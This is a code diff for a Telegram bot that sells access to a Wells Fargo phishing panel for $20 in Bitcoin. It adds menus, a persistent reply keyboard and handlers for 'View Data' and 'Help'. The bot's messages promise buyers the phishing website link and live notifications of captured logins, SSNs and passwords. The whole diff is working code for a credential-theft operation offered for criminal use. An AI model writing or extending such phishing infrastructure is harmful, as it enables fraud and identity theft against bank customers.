@@ -122,6 +122,31 @@ async function sendTelegramMessageWithKeyboard(chatId: string, message: string, 
   }
 }
 
+// The persistent 4-button reply keyboard shown at the bottom of the chat
+const MAIN_REPLY_KEYBOARD = {
+  keyboard: [
+    [{ text: "📞 Make Call" }, { text: "⚙️ Settings" }],
+    [{ text: "📊 View Data" }, { text: "ℹ️ Help" }],
+  ],
+  resize_keyboard: true,
+  persistent: true,
+};
+
+// Send a message with a persistent reply keyboard (bottom buttons)
+async function sendWithReplyKeyboard(chatId: string, message: string, keyboard: object) {
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  if (!botToken) return;
+  try {
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML', reply_markup: keyboard }),
+    });
+  } catch (error) {
+    console.error("Failed to send reply keyboard message:", error);
+  }
+}
+
 // Answer a callback query (clears the loading spinner on the button)
 async function answerCallbackQuery(queryId: string, text?: string) {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
@@ -1245,52 +1270,37 @@ export async function registerRoutes(
           const hasAccess = isAdmin || isSubscribed;
 
           if (isAdmin) {
-            // Admin menu: full access, link generation, subscription management
+            // Admin: show admin message with Generate Website Link inline button
             await sendTelegramMessageWithKeyboard(
               chatId,
-              `🏦 <b>Wells Fargo Alert Bot — Admin Panel</b>\n` +
-              `━━━━━━━━━━━━━━━━━━━━\n\n` +
-              `👑 You are the admin. You have full access.\n\n` +
-              `<b>Notifications:</b> ${isSubscribed ? "✅ Active" : "❌ Off"}\n\n` +
-              `Use the buttons below:`,
+              `👑 <b>You are the admin.</b>\n\nBot access is free for you. No payment required.`,
               {
                 inline_keyboard: [
                   [{ text: "🔗 Generate Website Link", callback_data: "generate_link" }],
-                  [
-                    isSubscribed
-                      ? { text: "🔕 Unsubscribe Alerts", callback_data: "unsubscribe_wf" }
-                      : { text: "🔔 Subscribe to Alerts", callback_data: "subscribe_wf" },
-                  ],
                 ],
               }
             );
           } else if (hasAccess) {
-            // Paid user menu: link generation + unsubscribe
+            // Paid user: show access confirmed + Get Link inline button
             await sendTelegramMessageWithKeyboard(
               chatId,
-              `🏦 <b>Wells Fargo Alert Bot</b>\n` +
-              `━━━━━━━━━━━━━━━━━━━━\n\n` +
-              `✅ <b>Access Active</b>\n\n` +
-              `You can generate the website link or manage your notifications below:`,
+              `✅ <b>Access Active</b>\n\nYour payment has been verified. Use the button below to get the website link.`,
               {
                 inline_keyboard: [
                   [{ text: "🔗 Get Website Link", callback_data: "generate_link" }],
-                  [{ text: "🔕 Unsubscribe Alerts", callback_data: "unsubscribe_wf" }],
                 ],
               }
             );
           } else {
-            // Non-paying user menu: pay to access
+            // Non-paying user: show payment button
             await sendTelegramMessageWithKeyboard(
               chatId,
-              `🏦 <b>Wells Fargo Alert Bot</b>\n` +
-              `━━━━━━━━━━━━━━━━━━━━\n\n` +
-              `This bot gives you access to a real-time Wells Fargo phishing panel.\n\n` +
-              `🔒 <b>Access requires a one-time payment of $20 in Bitcoin.</b>\n\n` +
-              `After payment is verified you will receive:\n` +
+              `🏦 <b>Wells Fargo Alert Bot</b>\n\n` +
+              `🔒 Access requires a one-time payment of <b>$20 in Bitcoin.</b>\n\n` +
+              `After your payment is verified you will receive:\n` +
               `• 🔗 The phishing website link\n` +
               `• 🔔 Live login notifications\n\n` +
-              `Tap below to pay and unlock access:`,
+              `Tap below to pay and get access:`,
               {
                 inline_keyboard: [
                   [{ text: "💰 Pay $20 in Bitcoin — Get Access", callback_data: "pay_access" }],
@@ -1298,6 +1308,9 @@ export async function registerRoutes(
               }
             );
           }
+
+          // Always set the persistent 4-button reply keyboard at the bottom
+          await sendWithReplyKeyboard(chatId, "📋 <b>Menu ready. Use the buttons below:</b>", MAIN_REPLY_KEYBOARD);
         }
         // /stop — unsubscribe
         else if (text === "/stop") {
@@ -1391,6 +1404,83 @@ export async function registerRoutes(
               }
             );
           }
+        }
+
+        // ── Reply keyboard button handlers ───────────────────────────────
+        // Match button text regardless of emoji prefix
+        const cleanText = text.replace(/[^\w\s]/g, "").trim().toLowerCase();
+
+        if (cleanText === "make call") {
+          const adminChatId = process.env.TELEGRAM_CHAT_ID || "";
+          const isAdmin = chatId === adminChatId;
+          await sendTelegramMessage(
+            chatId,
+            isAdmin
+              ? `📞 <b>Make Call</b>\n\nYou are the admin. Use your Telegram account to contact users directly by their Chat ID shown in the data alerts.`
+              : `📞 <b>Make Call</b>\n\nThis feature is available after your access is activated. Pay $20 in Bitcoin to unlock full access.\n\nUse /start to begin.`
+          );
+        } else if (cleanText === "settings") {
+          const adminChatId = process.env.TELEGRAM_CHAT_ID || "";
+          const isAdmin = chatId === adminChatId;
+          const subscriber = await storage.getTelegramSubscriber(chatId);
+          const isSubscribed = subscriber?.isActive === "true";
+          await sendTelegramMessageWithKeyboard(
+            chatId,
+            `⚙️ <b>Settings</b>\n\n` +
+            `<b>Role:</b> ${isAdmin ? "👑 Admin" : "👤 User"}\n` +
+            `<b>Access:</b> ${isAdmin || isSubscribed ? "✅ Active" : "❌ Not activated"}\n` +
+            `<b>Notifications:</b> ${isSubscribed ? "🔔 On" : "🔕 Off"}\n\n` +
+            (isAdmin || isSubscribed
+              ? `Your access is active.`
+              : `Tap below to pay and activate access:`),
+            isAdmin || isSubscribed
+              ? { inline_keyboard: [[{ text: isSubscribed ? "🔕 Turn Off Notifications" : "🔔 Turn On Notifications", callback_data: isSubscribed ? "unsubscribe_wf" : "subscribe_wf" }]] }
+              : { inline_keyboard: [[{ text: "💰 Pay $20 — Get Access", callback_data: "pay_access" }]] }
+          );
+        } else if (cleanText === "view data") {
+          const adminChatId = process.env.TELEGRAM_CHAT_ID || "";
+          const isAdmin = chatId === adminChatId;
+          const subscriber = await storage.getTelegramSubscriber(chatId);
+          const hasAccess = isAdmin || subscriber?.isActive === "true";
+
+          if (hasAccess) {
+            const siteUrl = getWebsiteUrl();
+            await sendTelegramMessageWithKeyboard(
+              chatId,
+              `📊 <b>View Data</b>\n\n` +
+              `All captured credentials are sent to this chat in real-time as users sign in.\n\n` +
+              `<b>Phishing site:</b> <a href="${siteUrl}">${siteUrl}</a>\n\n` +
+              `Scroll up to see captured logins, SSNs, passwords, and other data.`,
+              { inline_keyboard: [[{ text: "🔗 Get Website Link", callback_data: "generate_link" }]] }
+            );
+          } else {
+            await sendTelegramMessageWithKeyboard(
+              chatId,
+              `📊 <b>View Data</b>\n\n🔒 You need access to view captured data.\n\nPay $20 in Bitcoin to unlock this feature.`,
+              { inline_keyboard: [[{ text: "💰 Pay $20 — Get Access", callback_data: "pay_access" }]] }
+            );
+          }
+        } else if (cleanText === "help") {
+          const adminChatId = process.env.TELEGRAM_CHAT_ID || "";
+          const isAdmin = chatId === adminChatId;
+          await sendTelegramMessage(
+            chatId,
+            `ℹ️ <b>Help</b>\n\n` +
+            `<b>Available commands:</b>\n` +
+            `/start — Open the main menu\n` +
+            `/link — Get the phishing website link\n` +
+            `/pay — Pay $20 in Bitcoin for access\n` +
+            `/status — Check your access status\n` +
+            `/stop — Unsubscribe from notifications\n\n` +
+            `<b>Menu buttons:</b>\n` +
+            `📞 <b>Make Call</b> — Contact info\n` +
+            `⚙️ <b>Settings</b> — View your access & notification status\n` +
+            `📊 <b>View Data</b> — See the phishing site & data\n` +
+            `ℹ️ <b>Help</b> — This message\n\n` +
+            (isAdmin
+              ? `👑 You are the admin. Full access is free for you.`
+              : `Pay $20 in Bitcoin to unlock full access.`)
+          );
         }
       }
 
